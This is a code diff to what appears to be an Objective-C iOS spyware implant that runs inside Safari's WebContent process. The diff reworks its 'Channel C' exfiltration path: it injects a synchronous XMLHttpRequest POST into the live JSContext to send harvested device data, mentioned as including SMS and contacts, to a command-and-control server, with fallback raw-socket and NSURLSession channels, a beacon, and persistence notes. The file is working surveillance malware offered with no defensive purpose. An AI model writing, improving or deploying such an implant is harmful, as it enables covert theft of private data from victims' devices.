@@ -5,7 +5,7 @@
  *
  *   Channel C — JavaScriptCore context injection  [PRIMARY in WebContent]
  *     Obtains the live JSContext via [JSContext currentContext].
- *     Evaluates a fetch() script using WebKit's own networking XPC path.
+ *     Evaluates a sync XMLHttpRequest POST (same stack as loading dylib in page).
  *     A saved reference is also dispatched to the main queue from the
  *     background implant thread (dispatch_async, non-blocking).
  *
@@ -30,6 +30,7 @@
  */
 
 #import <Foundation/Foundation.h>
+#import <objc/message.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -96,14 +97,14 @@ static NSString *c2_safe_str(const char *s) {
  * pointer, we execute on the JSC main thread while vm.topCallFrame is active.
  * [JSContext currentContext] returns the live JS context in this scenario.
  *
- * We build a self-executing fetch() script with the JSON body base64-encoded
- * (atob() in JS decodes it), then call [ctx evaluateScript:].  The fetch()
- * goes through WebKit's networking process XPC — the only allowed outbound
- * path inside WebContent.
+ * We inject a self-executing script with the JSON body base64-encoded (atob
+ * in JS).  Sync XMLHttpRequest is used for POST (same path as Stage3 loading
+ * bootstrap.dylib); it completes before evaluateScript returns, avoiding
+ * fire-and-forget fetch() races with page teardown / PAC cleanup.
  *
  * A strong reference to the context is saved so that the background implant
- * thread (implant_main) can dispatch fetch() calls to the main queue without
- * ever needing to block harvest_all().
+ * thread (implant_main) can dispatch the same upload script to the main queue
+ * without blocking harvest_all() on false positives (see upload_via_jsc_dispatch).
  */
 
 /* Strong reference to the captured JSContext.  Set at most once (in process()
@@ -111,7 +112,7 @@ static NSString *c2_safe_str(const char *s) {
  * background dispatches can fire as long as the page is loaded. */
 static id g_saved_jsc = nil;
 
-/* Build the JS fetch() script for a given body+uuid. */
+/* Build JS that POSTs JSON via synchronous XHR; returns true iff HTTP 2xx. */
 static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
     NSString *b64body = [body base64EncodedStringWithOptions:0];
     NSString *c2url   = [NSString stringWithFormat:@"%@://%s%s",
@@ -120,22 +121,39 @@ static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
     return [NSString stringWithFormat:
         @"(function(){"
         @"try{"
-        @"fetch('%@',{"
-        @"method:'POST',"
-        @"headers:{'Content-Type':'application/json','X-Device-UUID':'%@'},"
-        @"body:atob('%@')"
-        @"});"
-        @"}catch(e){}"
+        @"var x=new XMLHttpRequest();"
+        @"x.open('POST','%@',false);"
+        @"x.setRequestHeader('Content-Type','application/json');"
+        @"x.setRequestHeader('X-Device-UUID','%@');"
+        @"x.send(atob('%@'));"
+        @"return x.status>=200&&x.status<300;"
+        @"}catch(e){return false;}"
         @"})();",
         c2url, uuid, b64body];
+}
+
+/* Read boolean result from evaluateScript: (JSValue) without linking JSC headers. */
+static bool jsc_eval_script_yields_true(id ctx, NSString *script) {
+    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    if (!ctx || !script || ![ctx respondsToSelector:evalSel]) return false;
+
+    id (*sendId)(id, SEL, id) = (id (*)(id, SEL, id))objc_msgSend;
+    id jsv = sendId(ctx, evalSel, script);
+    if (!jsv) return false;
+
+    SEL toBoolSel = NSSelectorFromString(@"toBool");
+    if (![jsv respondsToSelector:toBoolSel]) return false;
+
+    BOOL (*sendBool)(id, SEL) = (BOOL (*)(id, SEL))objc_msgSend;
+    return sendBool(jsv, toBoolSel) ? true : false;
 }
 
 /*
  * upload_via_jsc_now — must be called from the JS execution thread.
  *
  * Calls [JSContext currentContext]; if non-nil saves it globally and
- * evaluates the fetch() script synchronously (the fetch itself is async).
- * Returns true if the script was dispatched.
+ * evaluates the upload script (sync XHR runs to completion inside eval).
+ * Returns true only if the script reports HTTP 2xx (avoids skipping B/A/D on failure).
  */
 static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
     Class jsCtxClass = NSClassFromString(@"JSContext");
@@ -153,8 +171,11 @@ static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
     if (!g_saved_jsc) g_saved_jsc = ctx;
 
     NSString *script = jsc_fetch_script(body, uuid);
-    [ctx performSelector:evalSel withObject:script];
-    return true;
+    @try {
+        return jsc_eval_script_yields_true(ctx, script);
+    } @catch (...) {
+        return false;
+    }
 }
 
 /*
@@ -193,9 +214,12 @@ static bool jsc_push_to_d2q(NSData *body) {
 /*
  * upload_via_jsc_dispatch — safe to call from any thread.
  *
- * Dispatches a fetch() evaluation to the main queue using the saved context.
- * Non-blocking (dispatch_async); suitable for background harvest uploads.
- * Returns false immediately if no saved context is available.
+ * Runs the same XHR script on the main queue and returns whether HTTP 2xx
+ * was observed.  Uses dispatch_sync when not already on main (avoids the
+ * previous bug: dispatch_async + unconditional true skipped B/A/D).
+ *
+ * Note: WebKit may associate JSContext with the JS worker thread, not main;
+ * this path is best-effort; failure falls through to B/A/D.
  */
 static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
     id ctx = g_saved_jsc;
@@ -204,18 +228,22 @@ static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
     SEL evalSel = NSSelectorFromString(@"evaluateScript:");
     if (![ctx respondsToSelector:evalSel]) return false;
 
-    /* Capture strong copies for the block; the block owns them until fired. */
-    __strong id capturedCtx    = ctx;
-    NSString  *capturedScript  = jsc_fetch_script(body, uuid);
+    __strong id capturedCtx   = ctx;
+    NSString *capturedScript = jsc_fetch_script(body, uuid);
 
-    dispatch_async(dispatch_get_main_queue(), ^{
+    __block bool ok = false;
+    void (^work)(void) = ^{
         @try {
-            [capturedCtx performSelector:evalSel withObject:capturedScript];
+            ok = jsc_eval_script_yields_true(capturedCtx, capturedScript);
         } @catch (...) {
-            /* Context may have been torn down if page navigated away. */
+            ok = false;
         }
-    });
-    return true;
+    };
+    if ([NSThread isMainThread])
+        work();
+    else
+        dispatch_sync(dispatch_get_main_queue(), work);
+    return ok;
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════
@@ -410,11 +438,10 @@ static NSData *make_json_body(NSString *uuid, const char *category,
 /*
  * upload_to_c2 — post one JSON record via Channel C → B → A.
  *
- * Channel C (JSContext fetch injection):
+ * Channel C (JSContext sync XHR injection):
  *   • On the JS thread (process() call):   upload_via_jsc_now()     [sync eval]
  *   • On a background thread (implant_main): upload_via_jsc_dispatch() [async]
- *   Works in WebContent because fetch() uses WebKit's own networking XPC.
- *   Worst-case addition: <1 ms on JS thread; 0 ms (non-blocking) on bg thread.
+ *   Uses WebKit's network stack from page JS (consistent with sync GET of dylib).
  *
  * Channel B (raw socket + TLS):
  *   Works outside WebContent (e.g. syslogd persistence).
@@ -454,10 +481,9 @@ void upload_to_c2(const char *category, const char *path,
             if (url) sent = nsurlsession_post(url, body, uuid);
         }
 
-        /* Channel D — in-memory queue for Stage3 JS relay.
+        /* Channel D — in-memory queue for optional Stage3 relay (if any).
          * Written when all three network channels fail (typical WebContent).
-         * Stage3 reads this queue after _process() returns and POSTs via
-         * its own fetch() which is whitelisted by WebKit's sandbox policy.
+         * Without JS changes nothing drains this queue; prefer Channel C success.
          * Items ≥ CRU_Q_B64MAX bytes (base64) are silently dropped here;
          * large payloads (SMS, contacts) arrive via the persistence path. */
         if (!sent) {
@@ -475,12 +501,12 @@ void upload_to_c2(const char *category, const char *path,
  * Called before coruna_constructor() so it executes on the JS execution
  * thread — the ideal moment for Channel C (JSContext is live).
  *
- * Channel C:  evaluates fetch() in current JSContext.  If this appears in
+ * Channel C:  evaluates sync XHR POST in current JSContext.  If this appears in
  *             server logs the description contains "(jsc)".
  * Channel B:  raw socket, works outside WebContent / after persistence.
  * Channel A:  NSURLSession fallback.
  *
- * Blocked time: <1 ms if Channel C succeeds; up to ~10 s if only B is tried.
+ * Blocked time: sync XHR latency if Channel C runs (~RTT); up to ~10 s if only B is tried.
  */
 void upload_beacon(void) {
     @autoreleasepool {
